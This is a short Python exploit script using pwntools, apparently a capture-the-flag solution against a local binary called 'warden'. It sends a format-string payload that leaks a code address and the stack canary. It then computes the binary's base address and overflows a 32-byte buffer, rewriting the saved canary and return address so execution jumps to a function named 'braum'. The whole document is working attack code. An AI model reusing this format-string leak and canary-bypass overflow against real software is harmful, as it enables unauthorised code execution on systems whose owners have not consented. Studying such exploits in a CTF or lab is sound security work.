from pwn import *
context.arch = 'i386'

p = process('./warden')
p.recvuntil(b'My defense is too solid to be breached.\n')

# Leak
p.sendline(b'%3$08x|%15$08x')
output = p.recvuntil(b'Pow Pow Pow\n')
values = output.split(b'Pow')[0].strip().split(b'|')
code_leak = int(values[0], 16)
canary = int(values[1], 16)

base = code_leak - 0x1433
braum = base + 0x12cd

print(f"Base: {hex(base)}, Canary: {hex(canary)}, braum: {hex(braum)}")

# Return to braum (which starts with endbr32)
payload = b'A' * 32
payload += p32(canary)
payload += p32(0)
payload += p32(0)
payload += p32(braum)

p.sendline(payload)
sleep(0.5)
print("Exit code:", p.poll(block=True))
